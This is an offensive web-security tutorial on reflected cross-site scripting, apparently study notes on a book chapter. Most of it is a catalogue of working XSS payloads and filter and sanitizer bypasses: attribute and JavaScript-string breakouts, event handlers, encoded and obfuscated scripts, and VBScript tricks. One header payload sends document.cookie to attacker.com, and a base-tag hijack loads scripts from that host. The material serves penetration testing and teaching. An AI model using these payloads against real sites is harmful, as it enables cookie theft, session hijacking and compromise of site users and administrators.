# 🧭 Section: **Finding and Exploiting Reflected XSS Vulnerabilities (Part 1)**

---

## 🔹 Step-by-Step Strategy for Detecting Reflected XSS

This is about being methodical — think like a scanner, but with a brain. Reflected XSS doesn’t store the payload; it just bounces it back in a response. The trick is to find where the app **mirrors** your input and **in what context**, then slip a script through that.

---

### 🧪 Step 1: Submit a **Benign Unique String**

**Why?**
To detect reflections **without triggering filters** or being mistaken for something already in the page.

**How?**
Pick a string like:

```
myxsstestdmqlwp
```

**Reasoning:**

* Purely alphabetic → unlikely to be encoded or filtered.
* Unique → easy to spot visually or via diff.
* Non-malicious → won’t trigger WAF or app filters.

> You’re not attacking yet — you’re probing the app like sonar.

---

### 🔍 Step 2: Detect Reflections in the Response

**Why?**
To find the places where input is echoed back into the page. This is the *must-have* condition for reflected XSS: **input → reflected into output**.

**What to Look For:**

* Reflected in raw HTML?
* Inside HTML attributes?
* Inside JavaScript?
* In comments or tags?

Each of those is a **different syntactic context**, and each needs a different payload structure later.

---

### 📦 Step 3: GET and POST — Test Both

**Why?**
Many testers forget POST — but reflected XSS **can** happen in POST parameters. Even though it’s harder to deliver (you can’t just send a clickable URL), **it’s still exploitable**.

**Pro tip:**
Use Burp's “**Change Request Method**” feature to flip POST → GET and see if the vuln is reachable with a URL.

This is gold for making the XSS:

* Sharable via email
* Embedded in img/script tags
* Delivered via cross-origin tricks

---

### 🧠 Step 4: Headers Are Inputs Too (Don’t Skip Them!)

> **Most people only test form fields or URL params. But in reality: every part of the HTTP request is an input vector.**

Especially:

| Header            | Why It’s Dangerous                   |
| ----------------- | ------------------------------------ |
| `Referer`         | Often shown in error/debug pages     |
| `User-Agent`      | Reflected in logs or status messages |
| `X-Forwarded-For` | Used by some apps to show client IP  |

**Why it works:**
These headers are often reflected in logs, error messages, or analytics dashboards. Admins view those pages. Boom — your XSS payload executes when they check logs.

---

### 🚨 Example: Header-Based Reflected XSS Chain

1. You inject XSS into the `User-Agent` header:

   ```
   Mozilla/5.0"><script>new Image().src='http://attacker.com/'+document.cookie</script>
   ```
2. App logs this header on an error page.
3. Admin views the error report.
4. Your payload executes in their browser.

> No visible UI. No login needed. All through an invisible string in a header. That’s stealth.

---

### 📌 Summary So Far

| Goal                     | Action                                          | Reasoning                                                |
| ------------------------ | ----------------------------------------------- | -------------------------------------------------------- |
| Detect reflected input   | Use benign string like `myxsstestdmqlwp`        | Avoids false positives, triggers, or interference        |
| Map reflection locations | Look for every spot your input shows up         | These are your targets for payload injection             |
| Understand context       | Identify whether it's HTML, JS, attribute, etc. | Payload must match context to break out and execute code |
| Test all input types     | GET, POST, headers                              | Vulnerabilities may hide in overlooked places            |
| Look beyond basics       | Include HTTP headers like Referer/User-Agent    | Advanced attack delivery options                         |

---

## 🔥 Section: **Testing Reflections to Introduce Script**

---

### 🎯 Goal:

Take reflected input → understand the *context* it appears in → inject **context-aware payload** to trigger JavaScript execution.

### Why context matters:

The browser parses HTML differently depending on *where* the input shows up:

* Inside a tag attribute?
* Inside a JS string?
* Inside raw HTML?
* Inside an event handler?

Understanding this is key. Blindly injecting `<script>` won’t always work — modern browsers are stricter, and WAFs often filter that. So we craft smarter.

---

## 🧪 **Example 1: Reflected Inside an Attribute Value**

### Input reflected here:

```html
<input type="text" name="address1" value="myxsstestdmqlwp">
```

Your reflection is inside the `value` attribute of a tag.

---

### 🚨 Attack Strategy 1: Break Out of the Attribute

#### Payload:

```html
"><script>alert(1)</script>
```

### 🧠 Logic:

1. `"` closes the attribute value.
2. `>` closes the `<input>` tag.
3. `<script>alert(1)</script>` is now injected as real HTML that gets parsed and executed.

> This works if the app doesn’t sanitize `"` or `<`.

---

### 🧨 Attack Strategy 2: Stay Inside the Tag, Use an Event Handler

#### Payload:

```html
" onfocus="alert(1)
```

### 🧠 Logic:

1. Still inside `<input ...>`.
2. `onfocus` is a valid attribute that executes when the field gains focus.
3. No need to break out of tag or use `<script>`.

> Stealthier and often bypasses basic filters that just block `<script>` or `<`.

---

## 🔥 **Example 2: Reflected Inside a JavaScript String**

### Input reflected here:

```html
<script>var a = 'myxsstestdmqlwp'; var b = 123;</script>
```

---

### 🚨 Attack Strategy: Break Out of the JS String + Continue Code

#### Payload:

```javascript
'; alert(1); var foo='
```

### 🧠 Logic:

1. `'` ends the current JS string.
2. `;` ends the current statement.
3. `alert(1);` executes your payload.
4. `var foo='` continues the JS in a valid way so the original code doesn’t error out.

#### Alternative trick:

```javascript
';alert(1)// 
```

* `//` comments out everything after the injection point → prevents errors if the remaining JS is malformed.

> Always think like a parser. JavaScript needs to remain syntactically valid *after* your payload or the code won’t run at all.

---

## ⚔️ **Example 3: Reflected Inside an Attribute Containing a URL**

### Input reflected here:

```html
<a href="myxsstestdmqlwp">Click here</a>
```

---

### 🚨 Attack Strategy: Use the `javascript:` URI Scheme

#### Payload:

```html
javascript:alert(1)
```

### 🧠 Logic:

1. `href` attributes allow URI schemes (`http:`, `mailto:`, etc.).
2. `javascript:` is also a valid scheme that executes JS.
3. When the user clicks the link → payload fires.

> Some browsers block this scheme in modern contexts (esp. if CSP is in place), but it’s still a viable test during assessment.

---

### 🧨 Bonus: Trick With Broken Images or Fragments

#### Payload:

```html
#" onclick="javascript:alert(1)
```

### 🧠 Logic:

1. `#` makes the link go nowhere.
2. `onclick` attribute hijacks the click behavior.
3. Payload runs without needing `javascript:` in href, bypassing CSP in some cases.

---

## 🛠️ HACK STEPS (Applied with Context):

### ✅ Step 1: Review Source

* View page source — *don’t* rely just on rendered view.
* Find exact spot where your benign string appears.

### ✅ Step 2: Treat Each Reflection Separately

* Even if the string appears 5 times → test each in its own context.
* One may be exploitable, others may not.

### ✅ Step 3: Understand the Syntactic Context

| Reflection appears in...    | Use this strategy                         |
| --------------------------- | ----------------------------------------- |
| HTML tag body               | Use `<script>`                            |
| Tag attribute               | Break out + use event handler or JS       |
| Inside JS string            | Close quote → end statement → inject code |
| URL field (href, src, etc.) | Use `javascript:` scheme or event handler |

### ✅ Step 4: Test Your Payload

* Use basic `alert(1)` first for visibility.
* Validate actual execution, not just rendering.
* Confirm if the payload survives → **then escalate** to real actions (cookie theft, DOM rewrites, etc.)

---

## 📌 Key Lessons Recap

| Concept                       | Why It Works / Matters                                                      |
| ----------------------------- | --------------------------------------------------------------------------- |
| Attribute escape (`" >`)      | Escapes current attribute context to inject new elements or code            |
| JavaScript escape (`';`)      | Escapes string and resumes valid code to avoid syntax errors                |
| Event handler (`onfocus=...`) | Triggers JS without script tag, works within tag attributes                 |
| `javascript:` in `href`       | Browser interprets as code — no script tag needed                           |
| `//` comment in JS contexts   | Ensures the rest of JS is ignored, avoiding breakage                        |
| Separate reflections per case | Context-specific behavior — one reflection might be exploitable, others not |
| Encoding matters              | Must URL-encode special characters (`<`, `>`, `"`, space) in request        |

---

## 🛡️ Section: **Probing Defensive Filters**

When your XSS payload gets blocked, that doesn’t mean game over — it just means the app has a **filter**. Your goal is now to:

* Figure out *what* the filter is doing.
* Then craft payloads that **sneak around** it.

---

### 🔎 Step 1: Understand the 3 Possible Filter Behaviors

| Behavior                     | What Happens                                                             | Your Move                                                                     |
| ---------------------------- | ------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| **Signature-based blocking** | The app detects “bad patterns” like `<script>` and **rejects or errors** | Try **payload obfuscation or alternate tags/contexts**                        |
| **Sanitization/Encoding**    | The app **mangles** your payload (e.g., converts `<` → `&lt;`)           | Use **filter evasion** tricks (attribute injection, encoding reversals, etc.) |
| **Truncation**               | Your input is **cut off** at a certain length                            | Use **short payloads** or chain injection across multiple fields              |

We'll tackle the **first one** here: signature-based blocking.

---

## 🧨 Beating Signature-Based Filters

Signature-based filters are like dumb bouncers:

* See `<script>`? Block it.
* See `onerror=`? Block it.

The problem? They're usually naive and rigid. You just need to **disguise** your payload or **change your approach**.

---

### 🧠 Tactic: Find What Triggers the Filter

**Approach:**

1. Start with a basic payload that gets blocked.
2. Remove parts bit by bit to isolate the triggering pattern (e.g., just `<`, then just `script`, etc.).
3. Once identified, switch to bypass mode.

---

## 🚀 Methods of Injecting Script Code (and Bypassing Filters)

Now let’s walk through the **4 core script delivery vectors**, including *why they work*, and some **obscure real-world bypasses** that still function.

---

### 1️⃣ **Script Tags**

Basic version:

```html
<script>alert(1)</script>
```

But filters usually block that. So...

#### 🔍 Why It Works:

Because script tags are an explicit JS execution context. Browser sees `<script>` → executes JS inside.

#### 🧨 Bypass Tactics:

**Using `data:` URIs inside other tags:**

```html
<object data="data:text/html,<script>alert(1)</script>">
```

**Base64-encoded payload:**

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

> Why this works: You're *embedding an HTML page* inside a tag that loads external content. Browser interprets the payload as new HTML, which contains your script.

✅ **Bypasses filters** that only scan the main request and miss nested HTML contexts.

---

### 2️⃣ **Event Handlers**

Instead of `<script>`, inject:

```html
<img src=x onerror=alert(1)>
```

#### 🔍 Why It Works:

Browsers execute event handlers like `onerror`, `onload`, `onfocus`, etc., when triggered by user or page behavior.

#### 🔥 Obscure Bypass Vectors:

* **No user interaction required:**

```html
<iframe onreadystatechange=alert(1)>
<xml onreadystatechange=alert(1)>
<object onerror=alert(1)>
```

* **HTML5-specific tricks:**

```html
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus>
</a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
```

> Why these work: They exploit *auto-triggering events* in modern and legacy HTML5 elements. No need for a click — the browser **automatically fires** the handler.

🧠 These often bypass filters that only scan for `onerror` inside `<img>` or `<script>`.

---

### 3️⃣ **Script Pseudo-Protocols**

```html
<a href="javascript:alert(1)">Click here</a>
<iframe src="javascript:alert(1)">
```

#### 🔍 Why It Works:

Browsers interpret `javascript:` URLs as executable code, *especially* in attributes that expect a URL (`href`, `src`, `action`).

#### 🧨 Filter Bypasses:

* Use uncommon tags:

```html
<form id=x /><button form=x formaction="javascript:alert(1)">
```

* Use **HTML5 hyphenated tags** (breaks old regex filters):

```html
<event-source src="javascript:alert(1)">
```

> Why this works: Filters often look for tag names like `<script>`, `<img>`, etc. They **don’t expect hyphenated tags** or protocol abuse in lesser-known attributes.

---

### 4️⃣ **Dynamically Evaluated Styles**

#### Legacy (IE7 and earlier):

```html
<x style="x:expression(alert(1))">
```

#### IE9+ (Compatibility mode or fallback):

```html
<x style="behavior:url(#default#time2)" onbegin="alert(1)">
```

#### 🔍 Why It Works:

Older IE browsers evaluated CSS `expression()` and behaviors as JavaScript.

This was *intended* for dynamic styles like:

```css
width: expression(document.body.offsetWidth * 0.5);
```

But attackers hijacked it for XSS.

> These are rare today but still valuable for **legacy app testing** or **kiosk bypass**.

---

## ✅ Summary Table: Evading Signature-Based Filters

| Technique            | Example                                      | Why It Works                                      |
| -------------------- | -------------------------------------------- | ------------------------------------------------- |
| **Tag Wrapping**     | `<object data="data:text/html,<script>...">` | Hides script inside another tag                   |
| **Base64 Encoding**  | `<a href="data:text/html;base64,...">`       | Encodes malicious HTML to evade pattern matching  |
| **Event Handlers**   | `<input autofocus onfocus=...>`              | Browser auto-triggers event without interaction   |
| **Pseudo-Protocols** | `href="javascript:..."`                      | Browser executes JS as if it were a link          |
| **HTML5 Tags**       | `<video src=1 onerror=...>`                  | Exploits newer tags not recognized by old filters |
| **CSS/IE Hacks**     | `<x style=expression(...)>`                  | Legacy IE-specific JS-in-CSS tricks               |

---

## 🧠 Why Signature Filters Fail

1. **Too narrow**: Only block `<script>` and `onerror`.
2. **Too literal**: Don’t decode Base64, don’t parse embedded tags.
3. **Don’t emulate browsers**: The browser will happily execute malformed or weirdly-encoded payloads.
4. **Regex ≠ parser**: HTML is not regex-friendly. That’s why regex-based filters fail.

---

## Bypassing Filters: HTML

### Goal:

You're trying to bypass XSS filters that rely on:

* **Regular expressions**, or
* **Pattern-based signatures**

…by creatively **breaking their assumptions about HTML structure**, while still writing payloads browsers will interpret as valid and executable.

---

## 🎭 1. **Obfuscating Tag Names**

### 🔹 What’s the basic idea?

Filters often scan for specific tag names like `<script>`, `<img>`, `<iframe>`, etc. If you change the way the tag appears *just enough to fool the filter but not the browser*, you win.

---

### 🔹 Techniques and *Why* They Work:

#### ✅ Case variation:

```html
<iMg onerror=alert(1) src=a>
```

* **Why it works:** HTML is **case-insensitive**. So `<IMG>` and `<img>` are the same to the browser, but a naive filter doing `/<img/` won’t catch `<iMg>`.

#### ✅ NULL byte injection (`%00`):

```html
<i[%00]mg onerror=alert(1) src=a>
```

* **Why it works:** NULL bytes (`%00`) are used to **terminate strings** in many programming languages and WAFs. Filters may think the input ends there and ignore the rest, but the browser doesn’t.

#### ✅ Arbitrary tag names with event handlers:

```html
<x onclick=alert(1)>Click</x>
```

* **Why it works:** Most filters are tuned to block `<script>` and `<img>`, but **event handlers (`onclick`, etc.) can be attached to *any tag***. Even a made-up tag like `<x>`.

#### ✅ Base Tag Hijacking:

```html
<base href="http://attacker.com/scripts/">
<script src="legit.js"></script>
```

* **Why it works:** `<base>` redefines how relative URLs are resolved. If the site loads scripts after your injected base tag, the browser will **pull attacker’s script but run it in the site’s origin.**

---

## 🔹 2. **Space After Tag Name**

### Examples:

```html
<img/onerror=alert(1)>
<img%09onerror=alert(1)>
<img/anyjunk/onerror=alert(1)>
```

### ✅ Why it works:

* HTML parsers tolerate **tabs (`%09`), line breaks (`%0a`), carriage returns (`%0d`)**, or junk between the tag name and attributes.
* Filters that expect a **space after `<img`** will fail to detect the attack.

---

## 🔹 3. **Attribute Name Obfuscation**

### Example:

```html
<img o[%00]nerror=alert(1)>
```

### ✅ Why it works:

* Some filters block attribute names starting with `on` (like `onerror`), but adding a NULL byte **tricks the filter into thinking it’s not an event handler.**
* Browser **ignores the NULL byte** and parses the full event handler.

---

## 🔹 4. **Attribute Delimiters & Order**

### Example with backticks:

```html
<img onerror=`alert(1)`>
```

### ✅ Why it works:

* Backticks **aren’t officially valid**, but **IE and other legacy browsers allow them** as attribute value delimiters.
* Filters may only scan for `"value"` or `'value'`.

### Example with attribute reordering:

```html
<img src=`a`onerror=alert(1)>
```

* If filter only checks attributes like `onerror=...`, it won’t catch this reordered variant.

---

## 🔹 5. **No Whitespace Required**

### Example:

```html
<img/onerror=”alert(1)”src=a>
```

* No whitespace between attributes, which **breaks some filters** expecting space-separated attributes.

---

## 🔹 6. **Obfuscating Attribute Values**

### NULL Byte + HTML Entity Encoding:

```html
<img onerror=a[%00]lert(1)>
<img onerror=a&#x6c;ert(1)>
```

### ✅ Why it works:

* Browsers **decode HTML entities** (like `&#x6c;` = `l`) before execution.
* This **bypasses filters** that scan for known payload strings like `alert(`.

---

## 🔹 7. **Obfuscating Pseudo-Protocols**

### Example:

```html
<iframe src=j&#x61;vascript:alert(1)>
```

* `&#x61;` = `a`, so this decodes to `javascript:alert(1)`.
* Bypasses filters checking for `javascript:` directly.

---

## 🔹 8. **Tag Bracket Tricks**

### Double-encoding:

```http
%253cimg%20onerror=alert(1)%20src=a%253e
```

#### Process:

1. `%253c` → `%3c` → `<`
2. `%3cimg ... %3e` → `<img ... >`

✅ **Why it works:** Some apps **decode input twice**, especially during logging or preprocessing stages.

---

### Unicode Brackets (glyph lookalikes):

```html
«img onerror=alert(1) src=a»
```

* `%u00AB` and `%u00BB` are **double-angle brackets**.
* Some **frameworks auto-convert** them to `<` and `>`, enabling the attack.

---

### Superfluous brackets:

```html
<<script>alert(1)//<</script>
```

* Browsers can recover from malformed tags like `<<script>`.
* Filters might reject `<script>` but ignore the double bracket syntax.

---

### E4X (ECMAScript for XML):

```html
<script<{alert(1)}/></script>
```

* Weird syntax that **older Firefox versions** parsed and executed.
* Useful when targeting **browser-specific vulnerabilities**.

---

## 🔹 9. **Character Sets and Encodings**

### Goal:

Deliver payloads encoded in alternative charsets (like UTF-7 or UTF-16) that the browser interprets correctly, but **filters don’t recognize**.

#### Example:

UTF-7:

```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```

UTF-16:

```
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00
```

### ✅ Why it works:

* Filters expecting UTF-8 or ASCII won't decode UTF-7/UTF-16 correctly.
* But browsers often **trust charset hints** from HTTP headers or `<meta charset=...>` and will interpret the payload as script.

---

### Advanced charset abuse (e.g., Shift-JIS):

#### Input 1:

```html
[%f0] ← multibyte lead byte in Shift-JIS
```

#### Input 2:

```html
"onload=alert(1);
```

### ✅ Why it works:

* In Shift-JIS, `%f0` + next byte is a **valid character**, so `"onload...` becomes **part of one character**, and not filtered.
* Second `"onload=...` becomes **an actual HTML attribute**, leading to execution.

---

## 💡 Key Insight

🧠 Most filters operate on **string-level assumptions** about well-formed HTML. Browsers don’t—they try to **“fix” broken HTML**. That’s the **mismatch** attackers exploit.

If the browser tolerates malformed input and runs your code, it’s a valid XSS attack—even if the app thinks it’s safe.

---

## ✅ What You Should Practice

1. **Build a local HTML page**, test malformed inputs like:

   * Double angle brackets
   * Null bytes
   * Obfuscated `onerror` attributes

2. **Test with different encodings**:

   * Try `+ADw-script+AD4-...` using charset switching in browser dev tools.

3. **Simulate filter behaviors**:

   * Use regex in Burp or a test app to mimic basic filters.
   * Try payloads that break them.

---

## 🧠 Bypassing Filters: Script Code

Filters that aim to stop XSS usually try to block:

* **Keywords** (`alert`, `script`, `eval`, etc.)
* **Syntax characters** (`"`, `'`, `.`, `()`, etc.)
* **Dangerous functions** (`eval()`, `document.cookie`, etc.)

But JavaScript is flexible—*really flexible.* It allows **multiple encodings**, **runtime string building**, and **language mixing**. You can use this power to *bypass broken filters*.

---

## 🔓 JavaScript Escaping Tricks

### 🔸 Unicode Escaping

JavaScript lets you insert characters with `\uXXXX`.

```html
<script>a\u006cert(1)</script> 
```

🧠 Why it works:

* `\u006c` is `l`. So this becomes `alert(1)`.
* If the filter looks for `"alert"` literally, this bypasses it.
* Browsers decode this **before** script parsing.

---

### 🔸 Hex and Octal Escapes inside `eval()`

```html
<script>eval('a\x6cert(1)')</script>   // hex
<script>eval('a\154ert(1)')</script>   // octal
```

🧠 Why it works:

* `\x6c` = `l`, `\154` (octal) = `l`
* Still resolves to `alert(1)`, just written weirdly.

---

### 🔸 Fake Escapes / Garbage in Strings

```html
<script>eval('a\l\ert\(1\)')</script>
```

🧠 Why it works:

* JavaScript ignores garbage escape sequences in **strings**, so this gets interpreted as `'alert(1)'`.

---

## 🧱 Dynamically Constructed Strings

You can **build dangerous strings on the fly**:

```html
<script>eval('al' + 'ert(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64 encoded 'alert(1)'
```

🧠 Why it works:

* Filters block `"alert"`—but if you construct it dynamically, they miss it.
* Base64 (`atob`) adds another layer of obfuscation.

---

## 🚫 Alternatives to `eval()`

Some filters block `eval` — but JavaScript has **many eval-like behaviors**.

```html
<script>'alert(1)'.replace(/.+/, eval)</script>  // Calls eval
<script>Function('alert(1)')()</script>          // Function constructor
```

🧠 Why it works:

* These act like `eval()` without using the word.
* `Function()` is often overlooked by weak filters.

---

## 🧩 Bypassing Dot (`.`) Blocking

Some filters block the period (`.`), which breaks `document.cookie`.

But you can still get what you want:

```html
<script>alert(document['cookie'])</script>
<script>with(document) alert(cookie)</script>
```

🧠 Why it works:

* Using bracket notation (`['cookie']`) or `with()` avoids the dot entirely.

---

## 🎭 Combining HTML + JavaScript Obfuscation

### Example:

```html
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
```

🧠 Why it works:

* `&#x5c;` = backslash, so it becomes `\u0065`, which is `e`.
* Result: `alert(1)`
* All encoded in HTML so it dodges both **HTML and JS** filters.

You can go further:

```html
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

All characters encoded = hard to detect.

---

## 🧪 Using VBScript (IE Only)

Modern browsers don't support this anymore, but older **Internet Explorer** versions do.

```html
<script language=vbs>MsgBox 1</script>
<img onerror="vbs:MsgBox 1" src=a>
```

🧠 Why it worked:

* IE could execute VBScript.
* Filters that target only JavaScript fail completely.

### Notable VBScript Properties:

* **No case sensitivity** (`MSGBOX`, `MsgBox`, `msgbox` all work)
* **Brackets optional**
* **Use `+1` instead of space**

```html
<img onerror=MsgBox+1 language=vbs src=a>
```

Filters that expect brackets and quotes get wrecked here.

---

## 🔁 Mixing JavaScript & VBScript

For full chaos, you can **cross-call** languages:

```html
<script>execScript("MsgBox 1", "vbscript")</script>
<script language=vbs>execScript("alert(1)")</script>
```

🧠 Why it works:

* `execScript()` lets you hop between JS ↔ VBScript
* VBScript can construct lowercased JS (`LCASE()`) to bypass case-enforcement:

```html
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)")) </SCRIPT>
```

---

## 🧬 Encoded Scripts (IE Only)

Microsoft had a custom script encoding system:

```html
<img onerror="VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@" src=a>
```

🧠 Why it worked:

* The script is Base64-like, hard to detect.
* IE would decode it automatically.
* Old anti-XSS filters didn’t know how to parse it.

Modern tools like `srcdec.exe` or online decoders can reverse-engineer this.

---

## 🧠 Summary Table

| Technique                  | Works By             | Defeats              |
| -------------------------- | -------------------- | -------------------- |
| `\u` Unicode escapes       | Hiding keywords      | Signature filters    |
| `eval('a'+'lert')`         | Dynamic construction | Keyword filters      |
| `Function()` / `replace()` | Alt-eval             | Eval restrictions    |
| `document['cookie']`       | Dotless deref        | Dot blockers         |
| VBScript                   | IE-only language     | JS-only filters      |
| HTML-encoded JS            | Mix of obfuscations  | Dual-layer filters   |
| Script encoding            | Encoded payloads     | Basic static filters |

---

## ✅ TL;DR

This section taught you how to **mutate JavaScript syntax** at runtime and **abuse browser quirks** to:

* **Dodge static filters**
* **Avoid detection**
* **Exploit even when keywords/characters are blocked**

Each technique is **grounded in real JavaScript flexibility**, and that’s why they work—**because browsers tolerate chaos**, and most filters don’t account for that chaos.

---

Here's a **deep and full breakdown** of the section **“Beating Sanitization”** from Chapter 12 — including **logic**, **why each trick works**, and **realistic bypass scenarios** that directly reflect the text.

---

## 🛡️ Beating Sanitization — Full Breakdown (HackTheBox-style)

When XSS filters **actively change your input** (not just block it), you’re dealing with **sanitization**. Instead of blocking the payload, the application tries to **disarm** it — either by:

* Replacing dangerous characters (like `<`, `>`) with safe equivalents (like `&lt;`, `&gt;`)
* Escaping quotes or slashes
* Removing specific strings (like `<script>`)

But — as with all defense mechanisms — **most sanitizers are flawed**.

Let’s break down how to punch through these flawed protections.

---

### 🔐 1. Understand the Sanitizer

Before you bypass anything, first ask:

> **"What is it breaking, and what is it leaving untouched?"**

Examples:

* Are **angle brackets** being HTML-encoded?
* Are **script tags** being removed?
* Are **quotes escaped with `\`?**
* Are only the **first** dangerous string removed?

Once you know that, you can choose your technique.

---

### 🧼 2. HTML-Encoding-Based Sanitization

**Behavior**: `<` becomes `&lt;`, `>` becomes `&gt;`, etc.

🔨 **Bypass Logic**:

* If you're *inside an existing script block*, you **don’t need angle brackets.**

  * Example:

    ```html
    <script>var a = 'user input';</script>
    ```
  * Here, you only need to escape `'` or break out of it — no `<script>` required.

* Or use **alternative tags** like `<img onerror=...>` instead of `<script>`.

✅ **Use prior techniques**:

* Event handlers (`onerror`)
* Unicode, hex, or base64-encoded payloads
* String construction (like `String.fromCharCode()`)

---

### 🧹 3. Stripping/Removing Dangerous Tags

**Behavior**: The app removes `<script>` from your input.

🔨 **Bypass Logic**:

* Check if it removes **all** instances:

  ```html
  <script><script>alert(1)</script>
  ```

  – Some sanitizers only remove the *first* instance due to `replace()` vs `replaceAll()` mix-up.

* Try **recursive tricks**:

  ```html
  <scr<script>ipt>alert(1)</script>
  ```

* Try **confusing mixed tags**:

  ```html
  <scr<object>ipt>alert(1)</script>
  ```

🧠 Why it works:

* Browser interpreters may “fix” malformed or nested tags.
* The sanitizer strips `script` and `object`, but **not both at the same time**, allowing fragments to slip through.

---

### 🧨 4. Escaped Quotes Inside JavaScript

**Context**: Your input is being dropped inside a JS string:

```html
<script>var a = 'userinput';</script>
```

**Sanitizer behavior**: Escapes `'` as `\'`

🔨 **Bypass Logic**:

* Inject a **backslash followed by a quote**:

  ```js
  foo\';alert(1);// 
  ```

  Results in:

  ```js
  var a = 'foo\'; alert(1);//';
  ```

🧠 Why it works:

* Backslash escapes the closing quote → *you break out of the string*.
* `//` comments out the rest of the script.

---

### 🔁 5. Escaping the Escaper (Double Escaping)

Sometimes sanitizers escape quotes and also backslashes:

```js
'foo\\';alert(1);//'
```

If that’s the case, try **injecting a closing tag** to break out:

```html
</script><script>alert(1)</script>
```

🧠 Why it works:

* Browsers give **HTML tag parsing** priority.
* Even if the first `<script>` is broken due to malformed JavaScript, your new `<script>` runs fine.

✅ **This is a classic XSS move** when injecting inside a `<script>` block.

---

### 🎯 6. Encoding Quotes in Event Handlers (DOM-based)

**Context**:

```html
<a href="#" onclick="var a = 'userinput'; ...">
```

**Sanitizer behavior**: Escapes `'` and `\`

🔨 **Bypass Logic**: Use **HTML-encoded characters** that decode later:

```html
foo&apos;;alert(1);//
```

Becomes:

```html
<a href="#" onclick="var a = 'foo&apos;;alert(1);//'; ...">
```

🧠 Why it works:

* HTML decoding occurs **before** JavaScript execution in attributes like `onclick`.
* `&apos;` → `'` just in time to break out of the string.

This is a classic **DOM-based XSS** bypass.

---

## 🔍 Filter Bypass Checklist

When you're testing sanitization, ask yourself:

| ✅ Test                             | 🔎 Purpose                                      |
| ---------------------------------- | ----------------------------------------------- |
| Are angle brackets being encoded?  | Blocks `<script>` or `<img>`?                   |
| Are quotes being escaped with `\`? | Can I break out of strings?                     |
| Is the backslash itself escaped?   | Can I double escape?                            |
| Are tags removed or encoded?       | Can I bypass with other tags or event handlers? |
| Is there recursive sanitization?   | Can I nest elements?                            |
| Are multiple layers used?          | Can I exploit ordering?                         |

---

## 🧠 Real-World Logic: Why This All Works

Most filters operate at a **syntactic** level:

* They look for literal patterns like `<script>`, `alert(`, or `"`
* They don’t interpret how a browser will **decode and execute** the content.

Browsers, meanwhile:

* Are **lenient and forgiving** — they “repair” broken markup.
* Decode HTML and JS **in stages**, which lets attackers sneak things through if they understand the execution flow.

---

## ✅ TL;DR

* **Sanitizers are often broken** — either by poor logic, improper escaping, or failure to handle browser quirks.
* Test what characters get changed.
* Try to bypass with encoding, escaping, tag trickery, or string breaking.
* Event handlers, script tags, and malformed nesting are your tools.

---